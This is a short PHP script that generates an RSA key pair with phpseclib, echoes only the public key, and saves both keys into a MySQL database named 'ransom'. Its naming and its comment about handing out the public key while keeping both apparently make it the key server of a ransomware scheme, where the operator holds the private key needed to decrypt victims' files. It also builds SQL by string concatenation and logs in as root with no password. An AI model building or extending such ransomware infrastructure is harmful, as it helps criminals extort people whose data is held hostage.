<?php
include('lib/Crypt/RSA.php');

$rsa = new Crypt_RSA();

extract($rsa->createKey());

//we just give the public key and we save both into database
echo $publickey;
//save pair to database
$con=mysqli_connect("localhost","root","","ransom");
$con->query("INSERT INTO `db_keys` (`id`, `private_key`, `public_key`) VALUES (NULL, '".$privatekey."', '".$publickey."');");
?>